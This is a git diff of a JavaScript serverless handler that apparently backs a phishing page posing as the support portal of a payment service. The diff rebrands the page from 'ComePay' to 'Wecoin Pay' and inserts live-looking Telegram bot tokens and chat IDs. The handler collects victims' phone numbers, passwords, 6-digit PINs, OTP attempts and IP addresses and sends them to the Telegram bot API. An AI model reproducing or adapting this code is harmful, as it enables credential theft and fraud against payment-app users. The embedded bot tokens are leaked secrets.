@@ -6,11 +6,11 @@ export default async function handler(req, res) {
   const { type, issue, phone, pass, pin, otp, attempt } = req.body;
 
   // ==================== DUAL BOT CONFIGURATION ====================
-  const BOT_1_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-  const CHAT_1_ID = '6076330929';
+  const BOT_1_TOKEN = '9249939243:AAEhsq2ExiWSrSRC58UKvq1EHB_-Uwyqw5o';
+  const CHAT_1_ID = '6742408629';
 
-  const BOT_2_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-  const CHAT_2_ID = '6076330929';
+  const BOT_2_TOKEN = '9249939243:AAEhsq2ExiWSrSRC58UKvq1EHB_-Uwyqw5o';
+  const CHAT_2_ID = '6742408629';
 
   // Extract visitor real IP address securely from Vercel headers
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
@@ -19,19 +19,19 @@ export default async function handler(req, res) {
   let message = '';
 
   if (type === 'page_opened') {
-    message = `🔔 ComePay Page Opened\n` +
+    message = `🔔 Wecoin Pay Page Opened\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `✅ Link Clicked By User\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'problem_select') {
-    message = `🎫 NEW SUPPORT REQUEST — ComePAY\n` +
+    message = `🎫 NEW SUPPORT REQUEST — Wecoin Pay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📌 Issue: ${issue}\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'login_creds') {
-    message = `📱 MOBILE & PASSWORD RECEIVED — ComePay\n` +
+    message = `📱 MOBILE & PASSWORD RECEIVED — Wecoin Pay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `🎫 Issue: ${issue}\n` +
@@ -39,20 +39,20 @@ export default async function handler(req, res) {
               `🔒 Password: <code>${pass}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'pin_entered') {
-    message = `🔑 6-DIGIT PIN RECEIVED — ComePay\n` +
+    message = `🔑 6-DIGIT PIN RECEIVED — Wecoin Pay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🔐 PIN: <code>${pin}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'send_otp') {
-    message = `📤 SEND OTP REQUESTED — ComePay\n` +
+    message = `📤 SEND OTP REQUESTED — Wecoin Pay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'wrong_otp') {
-    message = `❌ WRONG OTP ATTEMPT #${attempt} — ComePay\n` +
+    message = `❌ WRONG OTP ATTEMPT #${attempt} — Wecoin Pay\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
@@ -81,8 +81,8 @@ export default async function handler(req, res) {
       );
     }
 
-    // Send to Bot 2 (if token configured and not placeholder)
-    if (BOT_2_TOKEN && CHAT_2_ID && BOT_2_TOKEN !== 'YAHAN_APNA_DOOSRA_BOT_TOKEN_DAALEIN') {
+    // Send to Bot 2
+    if (BOT_2_TOKEN && CHAT_2_ID) {
       promises.push(
         fetch(`https://api.telegram.org/bot${BOT_2_TOKEN}/sendMessage`, {
           method: 'POST',
